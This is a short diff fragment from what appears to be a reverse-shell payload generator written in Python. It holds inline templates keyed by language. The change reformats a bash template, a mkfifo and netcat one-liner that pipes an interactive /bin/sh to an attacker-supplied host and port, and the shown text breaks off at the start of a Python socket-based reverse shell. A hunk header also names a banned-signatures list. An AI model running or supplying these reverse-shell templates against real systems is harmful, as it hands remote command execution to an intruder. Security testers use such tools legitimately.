@@ -54,10 +54,7 @@ _BANNED_SIGNATURES: list[str] = [
 # ── Inline Jinja2 templates (avoids dependency on filesystem templates dir) ────
 
 _TEMPLATES: dict[str, str] = {
-    "bash": (
-        "rm -f /tmp/.f;mkfifo /tmp/.f;"
-        "/bin/sh -i </tmp/.f 2>&1|nc {lhost} {lport} >/tmp/.f"
-    ),
+    "bash": ("rm -f /tmp/.f;mkfifo /tmp/.f;/bin/sh -i </tmp/.f 2>&1|nc {lhost} {lport} >/tmp/.f"),
     "python": (
         'python3 -c "import socket,subprocess,os;'
         "s=socket.socket();"
